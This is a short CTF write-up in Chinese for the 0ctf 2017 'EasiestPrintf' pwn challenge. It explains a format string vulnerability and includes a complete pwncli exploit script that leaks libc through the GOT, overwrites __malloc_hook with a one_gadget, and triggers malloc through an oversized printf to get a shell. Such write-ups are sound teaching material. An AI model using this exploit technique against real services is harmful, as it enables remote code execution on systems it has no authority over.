---
title: 0ctf_2017_EasiestPrintf
date: 2022-12-07 18:39:03
tags: [CTF, BUU, PWN, WP]
categories: 
    - CTF
    - BUU
    - Pwn
comment: true
---

# 0x01 分析
![](1.png)
- 没开PIE

![](2.png)
- 可以leak任意地址指向的数据

![](3.png)
- 存在格式化字符串漏洞

# 0x02 利用
- 首先leak got表指向的libc函数地址
- 利用格式字符串漏洞修改__malloc_hook位one_gadget
- 通过printf打印超过65536个字符来调用malloc

# 0x03 Exp
``` Python
#!/usr/bin/env python3
# Date: 2022-12-07 16:57:38
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf

libc=ELF("../libc/libc-2.23_32.so")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

read_got=elf.got['read']
exit_got=elf.got['exit']
rl()
sl(str(read_got))
read_addr=int(ru("\n",drop=True),16)
base=read_addr-libc.sym['read']
mh=base+libc.sym['__malloc_hook']
one=base+0x3a812
ru("Good Bye")
print(hex(base))
print(hex(one))
print(hex(mh))
p=fmtstr_payload(7,{mh:one})+b"%65599c"
sl(p)
stop()
ia()
```

# 0x04 总结
- printf打印超过65536个字符时，内部会调用malloc